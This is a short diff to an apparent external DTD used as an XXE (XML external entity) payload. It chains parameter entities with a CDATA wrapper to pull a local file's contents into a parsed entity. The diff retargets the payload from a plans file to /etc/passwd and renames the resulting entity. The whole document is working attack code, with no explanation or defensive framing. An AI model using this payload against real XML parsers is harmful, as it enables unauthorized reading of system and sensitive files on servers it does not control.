@@ -1,5 +1,5 @@
-<!ENTITY % file SYSTEM "file:///plans/next-op.txt">
+<!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % start "<![CDATA[">
 <!ENTITY % end "]]>">
-<!ENTITY % wrapper "<!ENTITY &#x25; all '%start;%file;%end;'>">
+<!ENTITY % wrapper "<!ENTITY &#x25; fileContents '%start;%file;%end;'>">
 %wrapper;
